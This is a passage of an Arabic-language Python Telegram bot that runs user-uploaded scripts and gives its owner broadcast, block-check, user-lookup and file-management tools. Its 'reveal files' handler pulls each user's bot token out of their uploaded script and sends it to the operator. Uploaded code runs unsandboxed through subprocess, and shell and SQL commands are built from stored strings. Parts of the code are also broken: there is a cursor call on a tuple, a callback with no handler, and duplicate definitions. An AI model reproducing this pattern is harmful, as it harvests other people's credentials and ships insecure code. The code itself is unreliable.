            bot.reply_to(message, "*- القناة المرسلة ليست موجودة في قائمة الاشتراك الاجباري داخل البوت❗.*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "*- يرجى إرسال معرف القناة بالشكل الصحيح (مثل: @channel_username) ⚠️.*", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == 'broadcast_forward')
def handle_broadcast(call):
    user_id = call.from_user.id
    subscription_markup = types.InlineKeyboardMarkup()
    subscription_markup.add(types.InlineKeyboardButton("- رجـوع", callback_data='back_owner'))

    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text= "*- قم بإرسال المحتوى الذي ترغب في إذاعته وإعادة توجيهه إلى جميع المستخدمين ✅ .*", reply_markup=subscription_markup, parse_mode='Markdown')
    bot.register_next_step_handler(call.message, forward_broadcast)

def forward_broadcast(message):
    user_id = message.from_user.id
    waiting = bot.reply_to(message, "*- جاري عملية الإذاعة، يرجى الانتظار ⏰...*", parse_mode='Markdown')
    with lock:
        cursor.execute('SELECT user_id FROM members')
        all_members = cursor.fetchall()
        cursor.execute('SELECT COUNT(user_id) FROM members')
        total_members = cursor.fetchone()[0]

        sent_count = 0
        blocked_count = 0

        for member in all_members:
            try:
                if message.text:
                    bot.forward_message(member[0], message.chat.id, message.message_id)
                elif message.photo:
                    bot.forward_message(member[0], message.chat.id, message.message_id)
                elif message.video:
                    bot.forward_message(member[0], message.chat.id, message.message_id)
                elif message.sticker:
                    bot.forward_message(member[0], message.chat.id, message.message_id)
                elif message.voice:
                    bot.forward_message(member[0], message.chat.id, message.message_id)
                else:
                    bot.reply_to(message, "*- هذا النوع من الإذاعة غير مدعوم حاليًا❗.*", parse_mode='Markdown')
                    bot.delete_message(user_id, waiting.message_id)
                    return
                sent_count += 1
            except telebot.apihelper.ApiException as e:
                if e.result.status_code == 403:
                    blocked_count += 1

        bot.send_message(YOUR_BOT_OWNER_ID, f"*- تمت عملية الإذاعة بنجاح ✅\n\n• احصائيات الإذاعة :-\nعدد الأشخاص الذين تم إعادة توجيه الرسالة إليهم :- {sent_count}\nعدد الأشخاص الذين قاموا بحظر البوت :- {blocked_count} 🚫\n\n• عدد الاعضاء الكلي :- {total_members} 👥 .*", parse_mode='Markdown')
        bot.delete_message(user_id, waiting.message_id)                    
        
@bot.callback_query_handler(func=lambda call: call.data == 'broadcast')
def handle_broadcast(call):
    user_id = call.from_user.id
    subscription_markup = types.InlineKeyboardMarkup()
    subscription_markup.add(types.InlineKeyboardButton("- رجـوع", callback_data='back_owner'))

    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text= "*- قم بإرسال المحتوى الذي ترغب في إذاعته إلى جميع المستخدمين ✅ .*", reply_markup=subscription_markup, parse_mode='Markdown')
    bot.register_next_step_handler(call.message, send_broadcast)

def send_broadcast(message):
    user_id = message.from_user.id
    waiting = bot.reply_to(message, "*- جاري عملية الإذاعة، يرجى الانتظار ⏰...*", parse_mode='Markdown')
    with lock:
        cursor.execute('SELECT user_id FROM members')
        all_members = cursor.fetchall()
        cursor.execute('SELECT COUNT(user_id) FROM members')
        total_members = cursor.fetchone()[0]

        sent_count = 0
        blocked_count = 0

        for member in all_members:
            try:
                if message.text:
                    bot.send_message(member[0], message.text, parse_mode='Markdown')
                elif message.photo:
                    bot.send_photo(member[0], message.photo[-1].file_id, caption=message.caption, parse_mode='Markdown')
                elif message.video:
                    bot.send_video(member[0], message.video.file_id, caption=message.caption, parse_mode='Markdown')
                elif message.sticker:
                    bot.send_sticker(member[0], message.sticker.file_id)
                elif message.voice:
                    bot.send_voice(member[0], message.voice.file_id, caption=message.caption, parse_mode='Markdown')
                else:
                    bot.reply_to(message, "*- هذا النوع من الإذاعة غير مدعوم حاليًا❗.*", parse_mode='Markdown')
                    bot.delete_message(user_id, waiting.message_id)
                    return
                sent_count += 1
            except telebot.apihelper.ApiException as e:
                if e.result.status_code == 403:
                    blocked_count += 1

        bot.send_message(YOUR_BOT_OWNER_ID, f"*- تمت عملية الإذاعة بنجاح ✅\n\n• احصائيات الإذاعة :-\nعدد الأشخاص الذين تم ارسال الرسالة إليهم :- {sent_count}\nعدد الأشخاص الذين قاموا بحظر البوت :- {blocked_count} 🚫\n\n• عدد الاعضاء الكلي :- {total_members} 👥 .*", parse_mode='Markdown')
        bot.delete_message(user_id, waiting.message_id)
        
@bot.callback_query_handler(func=lambda call: call.data == 'owner_stats')
def show_stats(call):
    user_id = call.from_user.id

    if str(user_id) == YOUR_BOT_OWNER_ID:
        markup = types.InlineKeyboardMarkup()
        item = types.InlineKeyboardButton("فحص عدد الذين قاموا بحظر البوت 🚫", callback_data='block_check')
        markup.add(item)

        cursor.execute('SELECT COUNT(user_id) FROM members')
        total_members = cursor.fetchone()[0]

        cursor.execute('SELECT COUNT(*) FROM user_files')
        total_files = cursor.fetchone()[0]

        bot.send_message(user_id, f"*- إحصائيات البوت 📊:\n\n• عدد الأعضاء الكلي: {total_members} 👥.\n• عدد الملفات المرفوعة: {total_files} 📂.*", reply_markup=markup, parse_mode='Markdown')
    else:
        pass
                  
@bot.callback_query_handler(func=lambda call: call.data == 'block_check')
def confirm_block_check(call):
    user_id = call.from_user.id

    markup = types.InlineKeyboardMarkup()
    yes_item = types.InlineKeyboardButton("حسناً ✅", callback_data='block_check_yes')
    no_item = types.InlineKeyboardButton("الغاء ❌", callback_data='block_check_no')
    select_message_item = types.InlineKeyboardButton("تحديد رسالة الفحص 📬", callback_data='select_check_message')

    markup.add(yes_item, no_item)
    markup.add(select_message_item)

    confirmation_message = bot.send_message(user_id, "*- تحذير: سيتم إرسال رسالة إلى جميع مستخدمين البوت لكي يتم حساب عدد الأعضاء الذين قاموا بحظر البوت ⚠️\nملاحظة: يتم ارسال الرسالة بدون صوت ويتم حذفها على الفور بعد ارسالها 💯\nرسالة الفحص الحالية: هل انت بخير 😑\n\n• إذا كنت تريد اكمال عملية الفحص اضغط زر 'حسناً' في الاسفل ✅*", reply_markup=markup,parse_mode='Markdown')

blocked_members = {}

@bot.callback_query_handler(func=lambda call: call.data == 'block_check_yes')
def process_block_check_confirmation(call):
    user_id = call.from_user.id
    global blocked_members

    waiting = bot.send_message(user_id, "*- جاري عملية الفحص، يرجى الانتظار...*", parse_mode='Markdown')
    blocked_members_count = 0
    all_members = cursor.execute('SELECT user_id FROM members').fetchall()

    for member in all_members:
        try:
            sent_message = bot.send_message(member[0], "هل انت بخير 😑", disable_notification=True)
            bot.delete_message(member[0], sent_message.message_id)
        except Exception as e:
            blocked_members_count += 1
            blocked_members[member[0]] = True

    bot.delete_message(user_id, waiting.message_id)
    markup = types.InlineKeyboardMarkup()
    no_item = types.InlineKeyboardButton("• حذف 🗑️", callback_data='dele_blocked_members')
    markup.add(no_item)
    bot.send_message(user_id, f"*- عدد الأعضاء الذين قاموا بحظر البوت:* {blocked_members_count} 🚫", reply_markup=markup, parse_mode='Markdown')

blocked_members = {}

@bot.callback_query_handler(func=lambda call: call.data == 'dele_blocked_members')
def confirm_delete_blocked_members(call):
    user_id = call.from_user.id
    total_members = cursor.execute('SELECT COUNT(user_id) FROM members').fetchone()[0]
    blocked_members_count = len(blocked_members)

    markup = types.InlineKeyboardMarkup()
    yes_item = types.InlineKeyboardButton("نعم ✅", callback_data='dele_blocked_members_yes')
    no_item = types.InlineKeyboardButton("لا ❌", callback_data='dele_blocked_members_no')

    markup.add(yes_item, no_item)

    confirmation_message = bot.send_message(user_id, "*- هل أنت متأكد من حذف الأعضاء الذين قاموا بحظر البوت؟\n\n• سيؤدي ذلك إلى حذف جميع المستخدمين المسجلين داخل قاعة البيانات والذين قاموا بحظر البوت كما أن عدد أعضاء البوت سيصبح {} بدلاً من {} 📉.*".format(total_members - blocked_members_count, total_members), reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == 'dele_blocked_members_yes')
def process_delete_blocked_members(call):
    user_id = call.from_user.id
    conn = create_connection()
    global blocked_members
    cursor.execute("DELETE FROM members WHERE user_id IN ({})".format(",".join(map(str, blocked_members.keys()))))

    bot.send_message(user_id, "*- تم حذف الأعضاء الذين قاموا بحظر البوت بنجاح ✅*", parse_mode='Markdown')

    blocked_members = {}

@bot.callback_query_handler(func=lambda call: call.data == 'dele_blocked_members_no')
def cancel_delete_blocked_members(call):
    user_id = call.from_user.id
    global blocked_members
    bot.delete_message(user_id, call.message.message_id)
    bot.answer_callback_query(call.id, text="- تم الغاء عملية حذف الأعضاء الذين قاموا بحظر البوت 📛.", show_alert=True)

    blocked_members = {}

@bot.callback_query_handler(func=lambda call: call.data == 'select_check_message')
def request_check_message(call):
    user_id = call.from_user.id
    global blocked_members
    bot.send_message(user_id, "*- قم بإرسال الرسالة التي ترغب في استخدامها لفحص عدد الذين قاموا بحظر البوت 💯\n\n• ملاحظة: سيتم إرسال الرسالة إلى جميع مستخدمين البوت من دون صوت وسيتم حذفها على الفور ✅*", parse_mode='Markdown')
    bot.register_next_step_handler(call.message, process_check_message)

def process_check_message(message):
    user_id = message.from_user.id
    check_message = message.text
    waiting = bot.send_message(user_id, "*- جاري عملية الفحص، يرجى الانتظار...*", parse_mode='Markdown')
    cursor = create_connection().cursor()

    blocked_members_count = 0
    all_members = cursor.execute('SELECT user_id FROM members').fetchall()

    for member in all_members:
        try:
            sent_message = bot.send_message(member[0], check_message, disable_notification=True)
            bot.delete_message(member[0], sent_message.message_id)
        except Exception as e:
            blocked_members_count += 1
            blocked_members[member[0]] = True
            
    bot.delete_message(user_id, waiting.message_id)
    markup = types.InlineKeyboardMarkup()
    no_item = types.InlineKeyboardButton("• حذف 🗑️", callback_data='delete_blocked_members')
    markup.add(no_item)
    bot.send_message(user_id, f"*- عدد الأعضاء الذين قاموا بحظر البوت:* {blocked_members_count} 🚫", reply_markup=markup, parse_mode='Markdown')
    
@bot.callback_query_handler(func=lambda call: call.data == 'block_check_no')
def cancel_block_check(call):
    user_id = call.from_user.id
    bot.delete_message(user_id, call.message.message_id)
    bot.answer_callback_query(call.id, text="- تم الغاء عملية الفحص 📛.", show_alert=True)
    
@bot.callback_query_handler(func=lambda call: call.data == "member_information")
def get_user_info(call):
    bot.send_message(call.message.chat.id, "*- قم بإرسال ايدي المستخدم المطلوب معرفة معلوماته داخل البوت 🗂️*", parse_mode='Markdown')

    bot.register_next_step_handler(call.message, proces_user_id)

def proces_user_id(message):
    try:
        user_id = int(message.text)
        
        cursor.execute('SELECT * FROM members WHERE user_id = ?', (user_id,))
        user_data = cursor.fetchone()

        if user_data:
            user_info = f"اسم المستخدم: {user_data[1]}\nالمعرف: @{user_data[2]}\nالإيدي: {user_data[0]}"
            
            user_info += "\nمسجل في قاعدة البيانات: نعم" if user_data else "\nمسجل في قاعدة البيانات: لا"
            button_view_profile = types.InlineKeyboardButton(text=user_data[1], url=f"tg://user?id={user_data[0]}")
            keyboard = types.InlineKeyboardMarkup()
            button = types.InlineKeyboardButton(text="- ارسال رسالة 📝", callback_data=f"send_message_{user_id}")
            keyboard.add(button_view_profile)
            keyboard.add(button)
            
            bot.reply_to(message, f"*{user_info}*", reply_markup=keyboard, parse_mode='Markdown')

        else:
            bot.reply_to(message, "*- لم يتم العثور على معلومات لهذا الإيدي في البوت ❌.*", parse_mode='Markdown')

    except ValueError:
        bot.reply_to(message, "*- الرجاء إرسال إيدي المستخدم كرقم 😑.*", parse_mode='Markdown')

    except Exception as e:
        bot.reply_to(message, f"*- حدث خطأ أثناء معالجة الطلب:* {str(e)}", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data.startswith('send_message_'))
def send_message_callback(call):
    user_id = call.data.split('_')[-1]
    bot.send_message(call.message.chat.id, f"*- قم بإرسال الرسالة المراد إرسالها إلى المستخدم  {user_id} 📨*", parse_mode='Markdown')
    bot.register_next_step_handler(call.message, process_message_to_user, user_id)

def process_message_to_user(message, user_id):
    try:
        bot.send_message(user_id, message.text)
        bot.reply_to(message, f"*- تم إرسال رسالتك إلى المستخدم {user_id} بنجاح ✅ .*", parse_mode='Markdown')

    except Exception as e:
        bot.reply_to(message, f"*- حدث خطأ أثناء إرسال الرسالة:* {str(e)}", parse_mode='Markdown')
        
@bot.callback_query_handler(func=lambda call: call.data == 'reveal_files')
def reveal_user_files(call):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("- رجـوع", callback_data='back_owner'))
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text= "*- قم بإرسال ايدي المستخدم المراد معرفة ملفاته المشغلة داخل البوت 🗃️:*",reply_markup=markup, parse_mode='Markdown')
    bot.register_next_step_handler(call.message, process_user_idrr)

def process_user_idrr(message):
    user_id = message.text.strip()
    try:
        cursor.execute('SELECT file_name FROM user_files WHERE user_id = ?', (user_id,))
        files = cursor.fetchall()

        if files:
            for file in files:
                file_name = file[0]
                bot_token = get_bot_token(file_name)
                with open(file_name, 'rb') as f:
                    markup = types.InlineKeyboardMarkup()
                    delete_button = types.InlineKeyboardButton("حذف الملف", callback_data=f"dellete_file_{file_name}")
                    markup.add(delete_button)
                    bot.send_document(message.chat.id, f, caption=f"توكن البوت: {bot_token}", reply_markup=markup)
        else:
            bot.send_message(message.chat.id, "*- لا يوجد ملفات تابعة لهذا المستخدم داخل البوت ❌.*", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(message.chat.id, f"حدث خطأ: {e}")
        
@bot.callback_query_handler(func=lambda call: call.data.startswith('dellete_file_'))
def delete_file_callback(call):
    file_name = call.data[len('dellete_file_'):]
    try:
        # Stop the process if it's running
        cursor.execute('SELECT process_id FROM user_files WHERE file_name = ?', (file_name,))
        result = cursor.fetchone()
        if result:
            process_id = result[0]
            if process_id:
                try:
                    os.system(f'kill {process_id}')
                except Exception as e:
                    print(f"Error stopping process: {e}")
        
        # Delete file from database
        cursor.execute('DELETE FROM user_files WHERE file_name = ?', (file_name,))
        conn.commit()

        # Delete file from filesystem
        if os.path.exists(file_name):
            try:
                os.remove(file_name)
                bot.reply_to(call.message,"*- تم ايقاف تشغيل الملف وحذفة من البوت بنجاح ✅.*", parse_mode='Markdown')
            except Exception as e:
                bot.answer_callback_query(call.id, text=f"حدث خطأ أثناء حذف الملف: {e}", show_alert=True)
        else:
            bot.answer_callback_query(call.id, text="الملف غير موجود.", show_alert=True)
    except Exception as e:
        bot.answer_callback_query(call.id, text=f"حدث خطأ: {e}", show_alert=True)
        


def restart_all_files():
    cursor.execute('SELECT file_name, user_id, file_path, upload_date FROM user_files')
    files = cursor.fetchall()

    for file in files:
        file_name = file[0]
        user_id = file[1]
        file_path = file[2]
        upload_date = file[3]
        
        # Check if the file exists before attempting to run it
        if os.path.exists(file_path):
            try:
                # Run the file directly
                process = subprocess.Popen(['python3', file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                cursor.execute('UPDATE user_files SET process_id = ? WHERE file_name = ?', (process.pid, file_name))
                conn.commit()
                print(f"تم بدء تشغيل الملف {file_name} بنجاح.")

                time.sleep(3)  # Wait to check if the file is running
                return_code = process.poll()

                if return_code is None:
                    print(f"الملف {file_name} يعمل بنجاح.")
                else:
                    print(f"حدث خطأ أثناء تشغيل الملف {file_name}.")
                    cursor.execute('DELETE FROM user_files WHERE file_name = ?', (file_name,))
                    conn.commit()
            except Exception as e:
                print(f"حدث خطأ أثناء محاولة تشغيل الملف {file_name}: {e}")
        else:
            print(f"الملف {file_name} غير موجود في المسار {file_path}.")
            cursor.execute('DELETE FROM user_files WHERE file_name = ?', (file_name,))
            conn.commit()

if __name__ == "__main__":
    conn, cursor = create_connection()
    restart_all_files()
    bot.infinity_polling()